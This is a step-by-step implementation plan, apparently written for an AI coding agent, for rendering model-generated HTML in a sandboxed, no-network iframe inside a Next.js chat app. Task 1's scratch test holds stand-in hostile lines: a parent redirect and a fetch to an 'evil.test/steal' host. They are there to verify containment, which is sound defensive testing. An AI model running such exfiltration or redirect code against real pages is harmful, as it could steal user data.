# Visual Artifacts in Chat — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Let the model render self-contained HTML/CSS/JS visuals inline in chat by emitting a fenced ` ```visual ` block that we render in a sandboxed, no-network iframe.

**Architecture:** A new `VisualArtifact` React component wraps untrusted model HTML in a fixed document template (enforced CSP + height-reporting script) and renders it via an iframe `srcdoc` with `sandbox="allow-scripts"` (no same-origin). The markdown renderer (`markdown-text.tsx`) registers language `visual` → `VisualArtifact` via `@assistant-ui/react-markdown`'s `componentsByLanguage`. A server-side system prompt in the chat route tells the model when/how to emit `visual` blocks.

**Tech Stack:** Next.js (App Router), React 19, TypeScript, `@assistant-ui/react`, `@assistant-ui/react-markdown`, Tailwind. Headless verification via `playwright-core` against the cached chromium.

## Global Constraints

- Fence tag is exactly **`visual`** (a ` ```visual ` code block).
- The model emits **body content only** (HTML + optional inline `<style>`/`<script>`); we add the document shell. Never trust the model to set security.
- Iframe sandbox is **`sandbox="allow-scripts"`** — `allow-same-origin` must NOT be present.
- Enforced CSP (verbatim, injected by us): `default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; font-src data:;` — i.e. **no network of any kind**.
- **No external libraries / no CDN / no network.** Charts via `<canvas>` or inline SVG only.
- Content is delivered via `srcdoc` (never an external URL); model HTML is interpolated as an inert string, only executed inside the sandboxed iframe.
- System prompt is set **server-side** in `app/api/chat/route.ts` and always applies (composed ahead of any client `system`).
- This repo has no unit-test framework; verification is production build + headless-browser checks with concrete expected output. Scratch test routes/scripts are created for a check and **deleted before commit** (never committed).
- Do not regress the existing weather card or plain markdown rendering.

**Headless-test harness (used by several tasks).** `playwright-core` is installed `--no-save` (not committed; `node_modules` is gitignored) and driven against the cached chromium. To (re)establish it in a task:
```bash
cd /home/yathu/code/rich-interface-chat-poc && npm install --no-save playwright-core >/dev/null 2>&1
CHROME=$(find "$HOME/.cache/ms-playwright" -maxdepth 3 -type f -name chrome -path '*chrome-linux64*' | head -1); echo "$CHROME"
```
Expected: a path like `/home/.../ms-playwright/chromium-1223/chrome-linux64/chrome`. If empty, install browsers with `npx -y playwright-core install chromium` (or use any system Chrome path).

---

### Task 1: VisualArtifact component (sandboxed iframe)

**Files:**
- Create: `components/assistant-ui/visual-artifact.tsx`
- Scratch (create, test, delete — do NOT commit): `app/_artifact-test/page.tsx`, `/tmp/va-task1.mjs`

**Interfaces:**
- Consumes: nothing (leaf component).
- Produces:
  - `VisualArtifact({ html: string })` — renders the sandboxed iframe (debounced) or a "Building visual…" placeholder while `html` is still changing.
  - `VisualArtifactHighlighter(props: SyntaxHighlighterProps)` — adapter that reads `props.code` and renders `<VisualArtifact html={props.code} />`; consumed by Task 2.

- [ ] **Step 1: Write the component**

Create `components/assistant-ui/visual-artifact.tsx`:
```tsx
"use client";

import { useEffect, useRef, useState } from "react";
import type { SyntaxHighlighterProps } from "@assistant-ui/react-markdown";

const MAX_HEIGHT = 600;
const DEBOUNCE_MS = 250;

// Wrap untrusted model HTML in a fixed document with an enforced no-network CSP
// and a height-reporting script. The model supplies body content only; the
// shell (and therefore the security policy) is always ours.
function buildSrcDoc(html: string): string {
  return `<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; img-src data:; font-src data:;" />
<style>html,body{margin:0;padding:0}*{box-sizing:border-box}body{font:14px/1.5 system-ui,-apple-system,sans-serif;color:#0f172a;padding:12px}</style>
</head>
<body>
${html}
<script>
(function(){
  function report(){
    try { parent.postMessage({ type: "aui-artifact-resize", height: document.documentElement.scrollHeight }, "*"); } catch (e) {}
  }
  try { new ResizeObserver(report).observe(document.documentElement); } catch (e) {}
  window.addEventListener("load", report);
  report();
})();
</script>
</body>
</html>`;
}

export function VisualArtifact({ html }: { html: string }) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [height, setHeight] = useState(120);
  // Debounce: commit a stable srcdoc so the iframe doesn't reload on every
  // streamed token. Until the html settles, show the placeholder.
  const [stableHtml, setStableHtml] = useState<string | null>(null);

  useEffect(() => {
    const t = setTimeout(() => setStableHtml(html), DEBOUNCE_MS);
    return () => clearTimeout(t);
  }, [html]);

  useEffect(() => {
    function onMessage(e: MessageEvent) {
      if (e.source !== iframeRef.current?.contentWindow) return;
      if (
        typeof e.data !== "object" ||
        e.data === null ||
        (e.data as { type?: unknown }).type !== "aui-artifact-resize"
      )
        return;
      const h = Number((e.data as { height?: unknown }).height);
      if (Number.isFinite(h) && h > 0) setHeight(Math.min(h, MAX_HEIGHT));
    }
    window.addEventListener("message", onMessage);
    return () => window.removeEventListener("message", onMessage);
  }, []);

  if (stableHtml === null) {
    return (
      <div
        data-slot="visual-artifact-loading"
        className="my-2 flex items-center gap-2 text-sm text-muted-foreground"
      >
        <span
          aria-hidden
          className="size-3.5 shrink-0 animate-spin rounded-full border-2 border-current border-t-transparent [animation-duration:0.6s]"
        />
        <span>Building visual…</span>
      </div>
    );
  }

  return (
    <iframe
      ref={iframeRef}
      data-slot="visual-artifact"
      title="Generated visual"
      sandbox="allow-scripts"
      srcDoc={buildSrcDoc(stableHtml)}
      className="my-2 w-full rounded-xl border border-border bg-white"
      style={{ height, maxHeight: MAX_HEIGHT }}
    />
  );
}

// Adapter for @assistant-ui/react-markdown `componentsByLanguage` (Task 2).
export function VisualArtifactHighlighter({ code }: SyntaxHighlighterProps) {
  return <VisualArtifact html={code} />;
}
```

- [ ] **Step 2: Add a scratch test route**

Create `app/_artifact-test/page.tsx` (renders the component directly with a sample that paints a canvas, reports a marker, and attempts a hostile action):
```tsx
"use client";

import { VisualArtifact } from "@/components/assistant-ui/visual-artifact";

const SAMPLE = `
<div id="card" style="padding:8px">
  <h3 style="margin:0 0 8px">Sales</h3>
  <canvas id="c" width="200" height="60"></canvas>
</div>
<script>
  // draw a tiny bar chart
  var ctx = document.getElementById('c').getContext('2d');
  var data = [30, 50, 20, 45];
  ctx.fillStyle = '#0ea5e9';
  data.forEach(function (v, i) { ctx.fillRect(i * 50 + 8, 60 - v, 30, v); });
  // marker the test can read
  document.getElementById('card').setAttribute('data-painted', 'yes');
  // hostile attempts — must be contained by sandbox + CSP
  try { parent.location = 'http://evil.test/'; } catch (e) {}
  try { fetch('http://evil.test/steal'); } catch (e) {}
</script>
`;

export default function ArtifactTestPage() {
  return (
    <div style={{ padding: 24 }}>
      <VisualArtifact html={SAMPLE} />
    </div>
  );
}
```

- [ ] **Step 3: Build to typecheck the component**

Run:
```bash
cd /home/yathu/code/rich-interface-chat-poc && npm run build 2>&1 | tail -8
```
Expected: build succeeds. (If the `_artifact-test` route causes a static-prerender complaint, that's fine — it's a client page and gets removed before commit.)

- [ ] **Step 4: Headless verify (sandbox, script runs, containment)**

Establish the harness (see Global Constraints), start the dev server (`npm run dev` in the background; wait for "Ready"), then write `/tmp/va-task1.mjs`:
```js
import { chromium } from "playwright-core";
const EXEC = process.env.CHROME;
const browser = await chromium.launch({ executablePath: EXEC, headless: true, args: ["--no-sandbox"] });
const page = await browser.newPage();
const evilRequests = [];
page.on("request", (r) => { if (r.url().includes("evil.test")) evilRequests.push(r.url()); });
await page.goto("http://localhost:3000/_artifact-test", { waitUntil: "networkidle" });
const frameEl = await page.waitForSelector('iframe[data-slot="visual-artifact"]', { timeout: 15000 });
const sandbox = await frameEl.getAttribute("sandbox");
const srcdoc = await frameEl.getAttribute("srcdoc");
const frame = await frameEl.contentFrame();
await frame.waitForSelector('#card[data-painted="yes"]', { timeout: 10000 });
const result = {
  hasIframe: true,
  sandboxAllowsScripts: (sandbox || "").includes("allow-scripts"),
  sandboxNoSameOrigin: !(sandbox || "").includes("allow-same-origin"),
  cspPresent: (srcdoc || "").includes("default-src 'none'"),
  scriptRan: true, // reached here only if [data-painted] appeared
  parentUrlUnchanged: page.url() === "http://localhost:3000/_artifact-test",
  evilRequests,
};
console.log(JSON.stringify(result, null, 2));
await browser.close();
const ok = result.sandboxAllowsScripts && result.sandboxNoSameOrigin && result.cspPresent && result.parentUrlUnchanged && evilRequests.length === 0;
process.exit(ok ? 0 : 1);
```
Run: `CHROME="$CHROME" node /tmp/va-task1.mjs`
Expected: JSON with `sandboxAllowsScripts:true`, `sandboxNoSameOrigin:true`, `cspPresent:true`, `scriptRan:true` (the `[data-painted]` selector resolved), `parentUrlUnchanged:true`, `evilRequests:[]`; exit 0. Stop the dev server.

- [ ] **Step 5: Remove scratch files and commit**

```bash
cd /home/yathu/code/rich-interface-chat-poc && rm -rf app/_artifact-test /tmp/va-task1.mjs && \
  git add components/assistant-ui/visual-artifact.tsx && \
  git commit -m "Add VisualArtifact: sandboxed no-network iframe for model HTML"
```
(Confirm `git status` shows no `_artifact-test` and that `package.json` is unchanged — playwright-core was installed `--no-save`.)

---

### Task 2: Render the `visual` fenced block via the markdown renderer

**Files:**
- Modify: `components/assistant-ui/markdown-text.tsx`
- Scratch (create, test, delete — do NOT commit): `app/_md-test/page.tsx`, `/tmp/va-task2.mjs`

**Interfaces:**
- Consumes: `VisualArtifactHighlighter` from Task 1.
- Produces: markdown rendering where a ` ```visual ` block becomes a `VisualArtifact` iframe; all other code blocks render unchanged.

- [ ] **Step 1: Register the `visual` language**

In `components/assistant-ui/markdown-text.tsx`, add the import (next to the other component imports):
```tsx
import { VisualArtifactHighlighter } from "@/components/assistant-ui/visual-artifact";
```
Then add `componentsByLanguage` to the `MarkdownTextPrimitive` (the component currently renders `<MarkdownTextPrimitive remarkPlugins={[remarkGfm]} className="aui-md" components={defaultComponents} defer />`). Change it to:
```tsx
    <MarkdownTextPrimitive
      remarkPlugins={[remarkGfm]}
      className="aui-md"
      components={defaultComponents}
      componentsByLanguage={{
        visual: {
          SyntaxHighlighter: VisualArtifactHighlighter,
          CodeHeader: () => null,
        },
      }}
      defer
    />
```

- [ ] **Step 2: Add a scratch test route that renders markdown standalone**

`TextMessagePartProvider` supplies text to `MarkdownText` without a full runtime. Create `app/_md-test/page.tsx`:
```tsx
"use client";

import { MarkdownText } from "@/components/assistant-ui/markdown-text";
import { TextMessagePartProvider } from "@assistant-ui/react";

const MD = [
  "Here is a visual:",
  "",
  "```visual",
  '<div id="hello" data-painted="no" style="padding:8px">Hi</div>',
  "<script>document.getElementById('hello').setAttribute('data-painted','yes')</script>",
  "```",
  "",
  "And a normal code block:",
  "",
  "```js",
  "const x = 1;",
  "```",
].join("\n");

export default function MdTestPage() {
  return (
    <div style={{ padding: 24 }}>
      <TextMessagePartProvider text={MD} isRunning={false}>
        <MarkdownText />
      </TextMessagePartProvider>
    </div>
  );
}
```

- [ ] **Step 3: Build to typecheck**

Run:
```bash
cd /home/yathu/code/rich-interface-chat-poc && npm run build 2>&1 | tail -8
```
Expected: build succeeds (no type error on `componentsByLanguage`).

- [ ] **Step 4: Headless verify (visual block → iframe; js block stays code)**

Start the dev server, establish `$CHROME` (Global Constraints), write `/tmp/va-task2.mjs`:
```js
import { chromium } from "playwright-core";
const browser = await chromium.launch({ executablePath: process.env.CHROME, headless: true, args: ["--no-sandbox"] });
const page = await browser.newPage();
await page.goto("http://localhost:3000/_md-test", { waitUntil: "networkidle" });
const frameEl = await page.waitForSelector('iframe[data-slot="visual-artifact"]', { timeout: 15000 });
const frame = await frameEl.contentFrame();
await frame.waitForSelector('#hello[data-painted="yes"]', { timeout: 10000 });
// the ```js block must NOT become an iframe — it should render as code text
const iframeCount = await page.locator('iframe[data-slot="visual-artifact"]').count();
const jsCodeVisible = await page.getByText("const x = 1;").count();
const result = { visualBecameIframe: true, iframeCount, jsCodeVisible };
console.log(JSON.stringify(result, null, 2));
await browser.close();
process.exit(iframeCount === 1 && jsCodeVisible >= 1 ? 0 : 1);
```
Run: `CHROME="$CHROME" node /tmp/va-task2.mjs`
Expected: `iframeCount:1` (only the `visual` block became an iframe), `jsCodeVisible:>=1` (the `js` block still rendered as text); exit 0. Stop the dev server.

Note: if the `visual` block renders wrapped in code-block chrome (a bordered `<pre>`), the custom `SyntaxHighlighter` should fully own its output — verify visually in the screenshot; if chrome appears, it means the library still wraps with `pre`, in which case render the iframe and accept the wrapper, or set the `visual` `CodeHeader` and confirm the `pre` styling is acceptable. The functional assertion above (iframe present, script ran) is the gate.

- [ ] **Step 5: Remove scratch files and commit**

```bash
cd /home/yathu/code/rich-interface-chat-poc && rm -rf app/_md-test /tmp/va-task2.mjs && \
  git add components/assistant-ui/markdown-text.tsx && \
  git commit -m "Render ```visual fenced blocks as VisualArtifact iframes"
```

---

### Task 3: Server-side system prompt + end-to-end verification

**Files:**
- Modify: `app/api/chat/route.ts`
- Scratch (create, test, delete — do NOT commit): `/tmp/va-task3.mjs`

**Interfaces:**
- Consumes: the markdown `visual` rendering from Task 2.
- Produces: the chat route always sends a base system prompt instructing the model when/how to emit ` ```visual ` blocks, composed ahead of any client `system`.

- [ ] **Step 1: Add the system prompt and compose it**

In `app/api/chat/route.ts`, add this constant above `export async function POST` (after `getModel`):
```ts
const VISUAL_SYSTEM_PROMPT = `You can render rich visuals inline in the chat when they materially help the answer — styled cards or callouts, side-by-side comparisons, simple diagrams or timelines, or simple charts. Prefer normal prose and markdown for ordinary answers; only use a visual when a custom layout adds real value.

To render a visual, output a single fenced code block tagged \`visual\` whose body is ONLY the visual's content: HTML, an optional inline <style>, and an optional inline <script>. Do NOT include <html>, <head>, or <body> tags — they are added for you.

Constraints for the visual (strictly enforced by the renderer):
- Fully self-contained: inline CSS and JS only. No external resources and no network of any kind (no remote scripts, styles, fonts, or images; no fetch/XHR/WebSocket). Use data: URIs only if an image is essential.
- Responsive to the container width.
- For charts, draw with <canvas> or inline SVG. No chart libraries are available.
- You may write normal prose before and after the block.

Example:
\`\`\`visual
<div style="font-weight:600">Quarterly revenue</div>
<canvas id="chart" width="320" height="120"></canvas>
<script>/* draw bars on #chart */</script>
\`\`\``;
```
Then replace the line `...(system ? { system } : {}),` with:
```ts
    system: system ? `${VISUAL_SYSTEM_PROMPT}\n\n${system}` : VISUAL_SYSTEM_PROMPT,
```

- [ ] **Step 2: Build to typecheck**

Run:
```bash
cd /home/yathu/code/rich-interface-chat-poc && npm run build 2>&1 | tail -6
```
Expected: build succeeds.

- [ ] **Step 3: Verify the route asks the model for a visual (API-level)**

Start the dev server (it inherits `OPENROUTER_API_KEY` from the shell). Confirm the model now emits a ` ```visual ` block for a visual-friendly prompt:
```bash
curl -N -s --max-time 90 -X POST http://localhost:3000/api/chat \
  -H 'Content-Type: application/json' \
  -d '{"messages":[{"id":"1","role":"user","parts":[{"type":"text","text":"Show me a simple bar chart of monthly sales (Jan 30, Feb 50, Mar 20) as a visual."}]}]}' \
  | grep -c 'visual'
```
Expected: a non-zero count (the streamed text contains a ` ```visual ` fence). If zero, the model declined to use a visual — make the prompt more explicit or strengthen the system prompt wording, then re-run.

- [ ] **Step 4: End-to-end headless verify (model → rendered sandboxed iframe)**

With the dev server running and `$CHROME` established, write `/tmp/va-task3.mjs`:
```js
import { chromium } from "playwright-core";
const browser = await chromium.launch({ executablePath: process.env.CHROME, headless: true, args: ["--no-sandbox"] });
const page = await browser.newPage({ viewport: { width: 900, height: 1100 } });
await page.goto("http://localhost:3000/", { waitUntil: "networkidle" });
const composer = page.locator('textarea, [contenteditable="true"]').first();
await composer.click();
await composer.fill("Show me a simple bar chart of monthly sales (Jan 30, Feb 50, Mar 20) as a visual.");
await page.keyboard.press("Enter");
let ok = false;
try {
  const frameEl = await page.waitForSelector('iframe[data-slot="visual-artifact"]', { timeout: 90000 });
  const sandbox = await frameEl.getAttribute("sandbox");
  ok = (sandbox || "").includes("allow-scripts") && !(sandbox || "").includes("allow-same-origin");
} catch { ok = false; }
await page.screenshot({ path: "/tmp/va-task3.png", fullPage: true });
console.log(JSON.stringify({ renderedSandboxedArtifact: ok }));
await browser.close();
process.exit(ok ? 0 : 1);
```
Run: `CHROME="$CHROME" node /tmp/va-task3.mjs`
Expected: `{"renderedSandboxedArtifact":true}`, exit 0. Open `/tmp/va-task3.png` to visually confirm a chart renders inline. Stop the dev server.

- [ ] **Step 5: Regression check (plain answer + weather card still work)**

Start the dev server and confirm a non-visual prompt stays plain text and the weather card still renders:
```bash
curl -N -s --max-time 60 -X POST http://localhost:3000/api/chat -H 'Content-Type: application/json' \
  -d '{"messages":[{"id":"1","role":"user","parts":[{"type":"text","text":"In one sentence, what is the capital of France?"}]}]}' | grep -c 'visual'
```
Expected: `0` (no `visual` block for a plain factual answer). Stop the dev server. (The weather card path is unchanged from its own verification; no code in this feature touches it.)

- [ ] **Step 6: Remove scratch files and commit**

```bash
cd /home/yathu/code/rich-interface-chat-poc && rm -f /tmp/va-task3.mjs && \
  git add app/api/chat/route.ts && \
  git commit -m "Add server-side system prompt for visual artifacts"
```

---

### Task 4: Demo suggestion + docs

**Files:**
- Modify: `app/page.tsx`
- Modify: `README.md`

**Interfaces:**
- Consumes: the finished feature (Tasks 1–3).
- Produces: a one-click demo suggestion and updated docs.

- [ ] **Step 1: Add a demo suggestion**

In `app/page.tsx`, the `useAui({ suggestions: Suggestions([...]) })` array currently has two entries (weather, fun fact). Add a third entry to the array:
```tsx
      {
        title: "Compare React vs Vue",
        label: "as a visual",
        prompt:
          "Compare React and Vue across a few dimensions, and present it as a visual.",
      },
```

- [ ] **Step 2: Document the feature in the README**

In `README.md`, under the "Try it" section, add a bullet after the generative-UI bullet:
```markdown
- **Visual artifacts** — ask for something visual ("compare React vs Vue as a
  visual", "draw a bar chart of … as a visual"). The model emits a self-contained
  HTML/CSS/JS block that renders inline in a **sandboxed, no-network iframe**
  (`sandbox="allow-scripts"`, strict CSP). Charts are drawn with canvas/SVG.
```
And under "How it works", add:
```markdown
- `components/assistant-ui/visual-artifact.tsx` — `VisualArtifact`, the sandboxed
  iframe renderer; `markdown-text.tsx` maps the ` ```visual ` fence to it. The
  artifact system prompt lives in `app/api/chat/route.ts`. See
  `docs/superpowers/specs/2026-06-25-visual-artifacts-design.md`.
```

- [ ] **Step 3: Build and commit**

Run:
```bash
cd /home/yathu/code/rich-interface-chat-poc && npm run build 2>&1 | tail -5
```
Expected: build succeeds.
```bash
git add app/page.tsx README.md && \
  git commit -m "Add visual-artifact demo suggestion and README docs"
```

---

## Notes for the implementer

- **Security is the point of this feature.** The Task 1 headless check (sandbox flags, CSP present, hostile payload contained, zero `evil.test` requests) is the most important gate — do not mark Task 1 done unless it passes. The two layers are independent: even if one were misconfigured, the other should still contain the artifact.
- **A provider key is required** for the Task 3 runtime checks (`OPENROUTER_API_KEY` is exported in the dev shell). If unavailable, complete build-only steps and flag the model-driven checks as blocked.
- **Scratch routes are never committed.** Each test route under `app/_*-test/` and each `/tmp/va-*.mjs` is created for a check and removed before that task's commit. Confirm `git status` is clean of them before committing.
- If `componentsByLanguage` behaves differently than the `mermaid` example implies (e.g. the custom `SyntaxHighlighter` output is still wrapped in code chrome), the functional gate (iframe present + script ran) still holds; adjust styling so the artifact reads as a card, not a code block.
